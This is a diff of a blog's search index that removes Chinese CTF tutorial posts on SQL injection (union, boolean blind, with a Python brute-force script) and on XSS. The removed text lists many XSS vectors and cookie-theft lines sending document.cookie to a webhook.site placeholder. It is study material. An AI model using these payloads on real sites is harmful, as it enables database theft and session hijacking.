- 注意多了一个引号。由于注入拼接语句后多了一个&#39;,需要用注释符进行消除对语句的影响
-③搜索型注入点这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword&#x3D;关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：
-select * from 表名 where 字段 like &#x27;%关键字%&#x27;`。组合出来的sql注入语句为：select * from news where search like &#x27;%测试 %&#x27; and &#x27;%1%&#x27;=&#x27;%1%&#x27;测试%&#x27; union select 1,2,3,4 and &#x27;%&#x27;=&#x27;
-
-
-
-
-
-判断注入点注意区别语句报错与页面报错、页面数据不正确的区别
-​	1.?id=1 and 1=1 和?id=1 and 1=2进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为数字型注入。
-​	2.?id=1&#39; and 1=1 --+ / #和?id=1&#39; and 1=2 --+ / #或使用?id&#39; and &#39;1&#39;=&#39;1和?id&#39; and &#39;1&#39;=&#39;2进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。
-​	3.?id=1%&#39; and 1=1 --+ / #和?id=1%&#39; and 1=2 --+ / #进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。
-注入方法]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF-Web</tag>
-        <tag>Web-SQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入-联合查询(union)注入</title>
-    <url>/posts/1145624611/</url>
-    <content><![CDATA[联合查询介绍联合查询语句：
-select a from b union select c from d where e;
-
-使用条件：页面对查询语句有回显查询数据
-注意事项：
-
-使用联合查询注入时,位于union前的语句不要出现查询的结果(后端只选择查询结果第一行的情况，若前一部分可以被查询，则联合查询的部分不会回显)
-
-若前部分有结果，可在每次的union查询后添加语句limit n,1(n根据题目实际进行切换)起到回显联合查询结果的作用
-注：limit num1，num2的作用为从第num1行开始显示num2行内容
-
-
-所需函数1.concat()函数
-​	concat()函数：将多个不同字段的字符串连接成一个字符串。
-concat(str1，str2) #语法
-
-注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。
-2.group_concat()函数
-​	group_concat() 将多个同个字段的字符串连接成一个字符串。
-group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’]) #语法
-
-注入流程
-判断类型链接：SQL注入-基础 | WELLS Blog
-
-字段数联合查询(union)，必选保证union前后两个查询的字段数一致，即两个查询结果有相同的列数，因此要对前一个的字段数进行判断。可以使用order by 数字进行判断
-注：order by n表示查询结果通过第n个字段进行排序
-使用示例：
-id=1&#x27; order by 1 --+
-
-使用时不断增大数字，假设直至第n个出现错误，从而判断出字段数为n-1
-
-回显点知道字段数之后，我们还需要确定在哪个字段是回显到页面上的
-直接根据字段数，联合查询数字1，2，3...,以三个字段数为例
-id=1&#x27; order by union select 1,2,3 --+
-
-从页面上查找回显的是哪个数字
-
-爆库名、表名，字段名，数据
-
-​	使用union语句在回显位置导出数据库中的数据，结合SQL注入-基础 | WELLS Blog中的SQL注入常用基础语句
-以2位置为回显点，爆表名为例
-id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF-Web</tag>
-        <tag>Web-SQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入-布尔盲注</title>
-    <url>/posts/1685515616/</url>
-    <content><![CDATA[布尔盲注介绍构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息
-使用条件：适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false类似的结果（例如：登录成功、）
-注意事项：
-
-前面参数在数据库无结果时，拼接语句使用关键词or
-
-前面参数在数据库有结果时，拼接语句使用关键词and
-另建议使用脚本
-
-
-注入使用函数1.substr()/substring()函数
-​	substr()/substring()函数：用来截取数据库某个字段中的一部分。
-substr(string，start开始位置，length截取长度)  #语法
-
-参数
-
-string：必选，数据库中需要截取的字段
-start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始   截取；0，在字符串中第一个位置开始截取。
-length：可选，需要截取的长度。缺省。即截取到结束位置
-
-2.ascii()函数
-​	ascii()函数：返回字符串str的最左边的数值。
-ascii(str)  #语法
-
-3.length() 函数
-​	length() 函数，返回字符串的长度
-length(str) #语法
-
-4.left() 函数
-​	left() 函数，返回从左至右截取固定长度的字符串
-left(str,n) #语法 截取字符串str的从左至右前n个字符
-
-
-
-注入流程
-求当前数据库长度
-求当前数据库表的ASCII (即爆出数据库名)
-求当前数据库中表的个数
-求当前数据库中其中一个表名的长度
-求当前数据库中其中一个表名的ASCII
-求列名的数量
-求列名的长度
-求列名的ASCII
-求字段的数量
-求字段内容的长度
-求字段内容对应的ASCII
-
-手工注入过程详解基本模板?id=1&#x27; and (长度/字符函数(所爆数据的SQL) = n) --+
-
-例如：
-?id=1&#x27; and ASCII(SUBSTR((select table_name FROM information_schema.tables where table_schema = database() LIMIT 0,1),1,1)) = 101 #
-
-
-
-以爆数据库名字为例
-求长度?id=1&#x27; and (length(database()) = n) --+
-
-通过页面的回显进行判断，数据库的长度是多少
-求数据库名称使用left 函数-- 从左至右截取一个字符SELECT * from users WHERE id = 1 and (left(database(),1)=&#x27;*&#x27;)-- 从左只有截取两个字符SELECT * from users WHERE id = 1 and (left(database(),2)=&#x27;**&#x27;)-- 从左只有截取n个字符SELECT * from users WHERE id = 1 and (left(database(),n)=&#x27;*****&#x27;)
-
-不断修改*中的字符，使之页面显示为true的类似项（如登录成功、成功等）
-使用SUBSTR函数-- 截取第1个字符SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),1,1)) = ***)-- 截取第2个字符SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),2,1)) = ***)-- 截取第n个字符SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),n,1)) = ***)
-
-不断修改*中的ASCII码，使之页面显示为true的类似项（如登录成功、成功等）
-注入脚本注意查看表单的提交变量名称
-使用POST提交数据
-import requestschars = &quot;R0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%/^!~&#123;&#125;&quot;result = &quot;&quot;def get_length(value):  # 获取要查询的数据的长度    for n in range(1, 100):        payload = &quot;admin&#x27; and length((&#123;0&#125;)) =&#123;1&#125; #&quot;.format(data_payload, n)        data = &#123;&quot;username&quot;: payload, &quot;password&quot;: &quot;admin&quot;&#125;  //注意查看表单的提交变量名称        html = requests.post(url, data=data)        length = len(html.text)        if length &lt; value:            print(&quot;……data length is :&quot; + str(n))            return ndef get_data(data_length, value):  # 获取数据    global result    for i in range(1, data_length):        for char in chars:            payload = &quot;admin&#x27;and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; #&quot;.format(data_payload, i, ord(char))            data = &#123;&quot;username&quot;: payload, &quot;password&quot;: &quot;admin&quot;&#125;  //注意查看表单的提交变量名称            html = requests.post(url, data=data)            length = len(html.text)            if length &lt; value:  # 根据返回长度的不同来判断字符正确与否                result += char                print(&quot;…… data is :&quot; + result)                breakurl = &quot;http://***.***.10.67:2081/hard.php&quot;data_payload = &quot;select password from users  limit 0,1&quot; //所爆数据的sql语句value = 550  # 根据正确访问和错误访问时返回页面文本长度的不同 来设置一个判断值，这个值需要在浏览器中 按f12 查看length = get_length(value) +1get_data(length, value)print(result)
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF-Web</tag>
-        <tag>Web-SQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQLMap</title>
-    <url>/posts/3150507853/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>XSS-基础篇</title>
-    <url>/posts/508713684/</url>
-    <content><![CDATA[XSS简介：动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，缩写成XSS）的威胁，恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。跨站脚本攻击允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容
-XSS的分类：1、反射型(非持久化)​	(1)原理
-​	反射型xss又称非持久型xss。发出请求时，此类XSS代码出现在URL中，作为输入提交到服务器端，XSS代码被服务器端解析后传回给浏览器，后解析执行XSS代码。
-​	(2)攻击方式
-​	攻击者将包含xss代码的恶意链接发送给目标用户。当其他用户访问该链接时，服务器接受该用户的URL中参数的请求并进行处理，后xss代码被服务器发送给其他用户的浏览器，触发xss漏洞
-2、存储型(持久化)​	(1)原理
-​	存储型XSS，提交的代码会存储在服务器端，其他用户请求该页面时会触发xss漏洞，无需访问攻击者的特定链接。例如：留言板中的XSS，用户提交一条包含XSS代码的留言存储到数据库，其他用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击
-​	(2)攻击方式
-​	攻击者将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，页面进行解析后响应，最后浏览器解析执行XSS代码，触发xss漏洞
-3、DOM-based型
-文档对象模型（DOM）是一个网络文档的编程接口。它代表页面，以便程序可以改变文档的结构、风格和内容。DOM 将文档表示为节点和对象；这样，编程语言就可以与页面交互。
-
-​	(1)原理
-​	DOM型xss其实是一种特殊类型的反射型xss，与反射型类似此类XSS代码出现在URL中，但DOM XSS和反射型XSS的区别在于DOM XSS代码并不需要服务器参与，依靠客户端进行解析。
-​	(2)攻击方式
-​	与反射型类似，当其他用户访问该链接时，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞
-XSS代码插入位置1.插入到HTML注释内容中&lt;!-- &lt;script&gt;  alert(&#x27;XSS&#x27;);&lt;/script&gt;--&gt;
-
-2.插入到HTML标签的属性值中&lt;img src=&quot;image,png&quot; onerror=&quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;&gt;
-
-注：onerror属性是HTML中&lt;img&gt;标签的一个事件属性，它用于定义当图像加载失败时执行的JavaScript代码。
-3.插入到HTML标签的属性名中使用语句
-&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
-
-构造闭合，可得到以下内容：
-&lt;input type=&quot;text&quot; name=&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;&gt;
-
-利用构造闭合的方式将恶意代码插入到某个标签中，将恶意代码插入到了标签中的属性值中，实现XSS攻击
-4.插入到HTML标签名中&lt; &lt;script&gt; alert(&#x27;XSS&#x27;) &lt;/script&gt;img src=&quot;/1.png&quot;&gt;
-
-浏览器会将第一个尖括号视为整体标签名的起始符号，而第二个尖括号则是&lt;script&gt; 标签的起始符号，导致浏览器误以为有两个标签被嵌套在一起，从而实现XSS攻击
-6.插入到CSS中&lt;div style=&quot;background-image:url(&#x27;javascript:alert(`1`)&#x27;);&quot;&gt;
-
-我们在background-image样式属性中插入了一段JavaScript url（在过去，一些浏览器可能没有严格限制这种用法，允许javascript:伪协议在CSS属性中执行JavaScript代码。），当用户打开这一个页面时，会执行弹窗，浏览器会执行我们插入的java伪协议代码，从而执行恶意代码。
-7.插入到HTTP响应中先留一个坑，还没看懂这个部分，后面再来填
-运行脚本的标签以及对应属性&lt;a&gt; 标签对应属性：
-href属性（手动点击）
-&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;
-
-onfocus（获取焦点时触发XSS，如:点击）
-&lt;a href=&quot;x&quot; onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/a&gt;
-
-onclick（点击时触发XSS）
-&lt;a href=&quot;x&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;
-
-onmouseover（鼠标悬停于该元素时触发XSS）
-&lt;a href=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;
-
-onmouseout（鼠标移出时触发XSS）。
-&lt;a href=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;
-
-
-
-&lt;img&gt;标签对应属性：
-onerror（加载错误时触发XSS、将src乱输入一个值即可）
-&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&lt;img src=x onerror=eval(&quot;alert(1)&quot;)&gt;
-
-onmouseover（鼠标悬停于该元素时触发XSS）
-&lt;img src=1 onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
-
-onmouseout（鼠标移出时触发XSS）
-&lt;img src=1 onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;v
-
-onclick（点击时触发XSS）。
-&lt;img src=1 onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
-
-
-
-&lt;iframe&gt;标签HTML 内联框架元素 (&lt;iframe&gt;)
-对应属性：
-onload（加载完成时触发XSS）
-&lt;iframe onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;&lt;iframe onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;&lt;iframe onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/iframe&gt;
-
-onmouseover（鼠标悬停于该元素时触发XSS）。
-&lt;iframe onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;
-
-src属性
-&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; //base64解码后为&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
-
-
-
-&lt;audio&gt; 标签&lt;audio&gt; 标签定义声音，比如音乐或其他音频流。
-对应属性：
-onerror（加载错误时触发XSS）
-&lt;audio src=1 onerror=alert(1)&gt;&lt;audio&gt;&lt;source src=&quot;x&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/audio&gt;
-
-onfocus（获取焦点时触发XSS，如:点击）
-&lt;audio controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/audio&gt;
-
-onmouseover（鼠标悬停于该元素时触发XSS）。
-&lt;audio controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;source src=&quot;x&quot;&gt;&lt;/audio&gt;
-
-
-
-&lt;video&gt;标签对应属性：
-onerror（加载错误时触发XSS）
-&lt;video src=x onerror=alert(1)&gt;&lt;video&gt;&lt;source onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;
-
-onmouseover（鼠标悬停于该元素时触发XSS）
-&lt;video controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;
-
-onfocus（获取焦点时触发XSS，如:点击）
-&lt;video controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/video&gt;
-
-onclick（点击时触发XSS）。
-&lt;video controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;
-
-
-
-&lt;svg&gt; 标签对应属性：
-onload（加载完成时触发XSS）
-&lt;svg onload=javascript:alert(1)&gt;&lt;svg onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/svg&gt;
-
-
-
-&lt;button&gt; 标签对应属性：
-onclick（点击时触发XSS）
-&lt;button onclick=alert(1)&gt;&lt;button onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;
-
-onfocus（获取焦点时触发XSS，如:点击）
-&lt;button onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/button&gt;
-
-onmouseover（鼠标悬停于该元素时触发XSS）
-&lt;button onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;
-
-onmouseout（鼠标移出时触发XSS）
-&lt;button onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;
-
-onmouseup（鼠标按钮释放时触发XSS）
-&lt;button onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;
-
-onmousedown（鼠标按钮按下时触发XSS）。
-&lt;button onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/button&gt;
-
-
-
-&lt;div&gt;标签对应属性：
-onmouseover（鼠标悬停于该元素时触发XSS）
-这个需要借助url编码来实现绕过
-原代码：&lt;div onmouseover=&#x27;alert(1)&#x27;&gt;DIV&lt;/div&gt;经过url编码：&lt;div onmouseover%3d&#x27;alert%26lpar%3b1%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt;
-
-
-
-&lt;object&gt;标签这个需要借助 data 伪协议和 base64 编码来实现绕过
-&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;
-
-
-
-&lt;script&gt; 标签&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;script&gt;alert(123)&lt;/script&gt;
-
-
-
-&lt;p&gt; 标签对应属性：
-onclick（点击时触发XSS）
-&lt;p onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;
-
-onmouseover（鼠标悬停于该元素时触发XSS）
-&lt;p onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;
-
-onmouseout（鼠标移出时触发XSS）
-&lt;p onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;
-
-onmouseup（鼠标按钮释放时触发XSS）。
-&lt;p onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;
-
-
-
-&lt;input&gt; 标签对应属性：
-onclick（点击时触发XSS）
-&lt;input onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
-
-onfocus（获取焦点时触发XSS，如:点击）
-&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;
-
-onmouseover（鼠标悬停于该元素时触发XSS）
-&lt;input onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;
-
-onkeydown（键盘按键按下时触发XSS）。
-&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;
-
-onkeydown（在键盘按键按下并释放一个键时触发XSS）。
-&lt;input type=&quot;text&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;
-
-
-
-&lt;details&gt;标签对应属性：
-ontoggle（切换时触发XSS，如:详情元素展开或收起）。
-&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/details&gt;&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/details&gt;
-
-
-
-&lt;select&gt; 标签对应属性：
-onfocus（获取焦点时触发XSS，如:点击）
-&lt;select onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/select&gt;
-
-onmouseover（鼠标悬停于该元素时触发XSS）
-&lt;select onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/select&gt;
-
-onclick（点击时触发XSS）。
-&lt;select onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/select&gt;
-
-
-
-&lt;form&gt; 标签对应属性：
-onmouseover（鼠标悬停于该元素时触发XSS）
-&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;
-
-onmouseout（鼠标移出时触发XSS）
-&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;
-
-onmouseup（鼠标按钮释放时触发XSS）。
-&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;
-
-action（提交表单时触发）
-&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;&lt;/form&gt;
-
-
-
-&lt;body&gt; 标签对应属性：
-onload（加载完成时触发XSS）
-&lt;body onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/body&gt;
-
-
-
-外带COOKIE获取cookie未设置为HttpOnly方法：document.cookie可获得所有的 Cookie，每条 cookie 以分号和空格 分隔 (即， key=value 键值对)。例如：
-uid=a378eb5d1c4e12d492e63273f7b68c01%40devS; language=zh; _gat=1
-
-
-
-设置为HttpOnly
-HttpOnly是包含在Set-Cookie HTTP响应头文件中的附加标志。生成cookie时使用HttpOnly标志有助于降低客户端脚本访问受保护cookie的风险（如果浏览器支持）。
-即如果某一个Cookie 选项被设置成 HttpOnly = true 的话，那此Cookie 只能通过服务器端修改，Js 是操作不了的，此时document.cookie 无效。
-
-方法一：cookie回显页面利用服务器中的cookie回显页面，如：PHPinfo页面
-条件：有相关请求页面可以回显出cookie
-参考链接：How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation
-方法二：TRACE HTTP
-HTTP定义了8种标准的请求方法，包括GET、POST、PUT、DELETE、HEAD、OPTIONS、TRACE和CONNECT。其中TRACE用于回显服务器收到的请求。
-
-条件：服务器支持TRACE方式请求
-注：现代浏览器不允许从 JS 发送 TRACE 请求，从而避免了这种技术。但是，在特定软件中发现了一些绕过此方法的方法，例如发送 \r\nTRACE 而不是 TRACE 发送到 IE6.0 SP2。
-方法三： Cookie Jar 溢出参考链接：Cookie Jar Overflow、Cookie Jar Overflow Attack
-方法四：表单劫持XSS能插入在登录表单页面，能直接获取登录的账号密码，使用账号密码登录
-方法五：浏览器漏洞、中间件漏洞例如：Apache服务器漏洞 CVE-2012-0053
-影响版本：2.2.0-2.2.21
-攻击者可通过向网站植人超大的Cookie,令其HTTP头超过Apache的LititRequestFieldSize (最大请求长度，4192字节)，使得Apache返回400错误，状态页中包含了HttpOnly 保护的Cookie。
-带出cookiefetch()方法全局的 fetch() 方法用于发起获取资源的请求。它返回一个 promise，这个 promise 会在请求响应后被 resolve，并传回 Response对象。例如：
-fetch(&#x27;//webhook.site/xxxxxxxx/?cookie=&#x27;+document.cookie)
-
-详细参考：fetch() - Web API 接口参考 | MDN (mozilla.org)
-XMLHttpRequest 对象利用 XMLHttpRequest 对象发送 HTTP 请求，将 Cookie 数据发送到攻击者的服务器：
-&lt;script&gt;var xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;, &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie, true); xhr.send();&lt;/script&gt;
-
-详细参考：XMLHttpRequest - Web API 接口参考 | MDN (mozilla.org)
-window.location 对象 window.location 可以把浏览器重定向到新的页面，此时可通过url携带cookie；使用方法例如：
-&lt;script&gt;window.location=&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;&lt;/script&gt;
-
-下面是window.location 对象中可用于跳转的方法：
-
-window.location.href：
-
-window.location.href = &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;
-
-
-window.location.assign(url)：
-
-window.location.assign(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);
-
-
-window.location.replace(url)：
-
-window.location.replace(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);
-
-
-
-window.open方法window.open() 是 JavaScript 中用于打开新窗口或新标签页的方法。它接受一个 URL 作为参数，返回一个新的浏览器窗口对象或者选项卡对象。
-例如，以下代码将会在新窗口或新标签页中打开指定 URL：
-window.open(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);
-
-document.write方法利用 document.write 写入某些含有src属性的标签，并将Cookie拼接到目标URL中，作为参数发送到指定的 IP 地址和端口
-&lt;script&gt;document.write(`&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=$&#123;document.cookie&#125;&quot; &gt;`)&lt;/script&gt;
-
-&lt;script&gt;document.write(&#x27;&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=&#x27;+document.cookie+&#x27;&quot;/&gt;&#x27;)&lt;/script&gt;
-
-附：带src属性的标签
-**&lt;img&gt;**：
-&lt;img src=&quot;image.jpg&quot; alt=&quot;示例图片&quot;&gt;
-
-**&lt;script&gt;**：
-&lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;
-
-**&lt;iframe&gt;**：
-&lt;iframe src=&quot;page.html&quot;&gt;&lt;/iframe&gt;
-
-&lt;video&gt; 和 **&lt;audio&gt;**：
-&lt;video src=&quot;video.mp4&quot; controls&gt;&lt;/video&gt;
-
-&lt;audio src=&quot;audio.mp3&quot; controls&gt;&lt;/audio&gt;
-
-&lt;embed&gt; 和 **&lt;object&gt;**：
-&lt;embed src=&quot;file.pdf&quot; type=&quot;application/pdf&quot;&gt;
-
-&lt;object data=&quot;file.swf&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;/object&gt;
-
-更多正在学习中…..
-jquery-ajax
-iCeServer
-Superagent
-socket
-axios
-
-jQuery AJAX
-
-首先确保你的项目中已经包含了jQuery。如果没有，你可以通过添加以下标签来引入：
-html
-&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js&quot;&gt;&lt;/script&gt;
-
-发送请求的示例代码：
-javascript
-$.ajax(&#123;  url: &#x27;YOUR_ENDPOINT_HERE&#x27;,  method: &#x27;GET&#x27;, // 或者 &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;, 等。  success: function(data) &#123;    console.log(data);  &#125;,  error: function(error) &#123;    console.error(&#x27;Request Failed:&#x27;, error);  &#125;&#125;);
-
-
-Axios
-
-Axios不是原生支持的，需要引入。你可以通过CDN添加Axios：
-html
-&lt;script src=&quot;https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js&quot;&gt;&lt;/script&gt;
-
-使用Axios发送请求：
-javascript
-axios.get(&#x27;YOUR_ENDPOINT_HERE&#x27;)  .then(function (response) &#123;    console.log(response.data);  &#125;)  .catch(function (error) &#123;    console.error(&#x27;Request Failed:&#x27;, error);  &#125;);
-
-
-Superagent
-
-Superagent也需要引入。通过CDN添加Superagent：
-html
-&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/superagent/6.1.0/superagent.min.js&quot;&gt;&lt;/script&gt;
-
-使用Superagent发送请求：
-javascript
-superagent  .get(&#x27;YOUR_ENDPOINT_HERE&#x27;)  .end((err, res) =&gt; &#123;    if (err) &#123; return console.error(&#x27;Request Failed:&#x27;, err); &#125;    console.log(res.body);  &#125;);
-
-
-WebSocket
-
-WebSocket是HTML5的一部分，不需要额外引入。但WebSocket用于实现双向通信，不同于常规的HTTP请求。以下是一个简单的WebSocket示例：
-javascript
-var socket = new WebSocket(&#x27;wss://YOUR_WEBSOCKET_ENDPOINT_HERE&#x27;);socket.onopen = function(event) &#123;  socket.send(&#x27;Hello Server!&#x27;); // 发送数据到服务器&#125;;socket.onmessage = function(event) &#123;  console.log(&#x27;Message from server &#x27;, event.data);&#125;;
-
-
-Fetch API
-
-Fetch API是现代浏览器原生支持的，不需要引入任何额外的库：
-javascript
-fetch(&#x27;YOUR_ENDPOINT_HERE&#x27;)  .then(response =&gt; response.json()) // 假设服务器返回的是JSON数据  .then(data =&gt; console.log(data))  .catch(error =&gt; console.error(&#x27;Request Failed:&#x27;, error));
-
-请替换 &#39;YOUR_ENDPOINT_HERE&#39; 和 &#39;wss://YOUR_WEBSOCKET_ENDPOINT_HERE&#39; 为你实际的请求URL或WebSocket端点。每种方法都有其特定的使用场景和优势，选择合适的根据你的项目需求而定。
-参考文章
-参考先知博主「Sh4d0w」的文章
-原文链接：https://xz.aliyun.com/t/12370
-
-参考「hacktricks」学习指南中的文章
-原文链接：https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies#httponly
-
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF-Web</tag>
-        <tag>Web-XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XXE-primer</title>
-    <url>/posts/67440817/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>文件上传漏洞</title>
@@ -5311,22 +5223,17 @@ JavaScript 标准内置对象 - JavaScript | MDN (mozilla.org)
       </tags>
   </entry>
   <entry>
-    <title>PHP文件包含</title>
-    <url>/posts/6864a512/</url>
-    <content><![CDATA[]]></content>
+    <title>反序列化漏洞-入门</title>
+    <url>/posts/2255213327/</url>
+    <content><![CDATA[施工中
+]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
         <tag>CTF-Web</tag>
-        <tag>Web-PHP</tag>
+        <tag>Web-Unserialize</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>SSTI漏洞-基础篇</title>
-    <url>/posts/416548136/</url>
-    <content><![CDATA[施工中
-]]></content>
   </entry>
   <entry>
     <title>XSS-Lab题解</title>
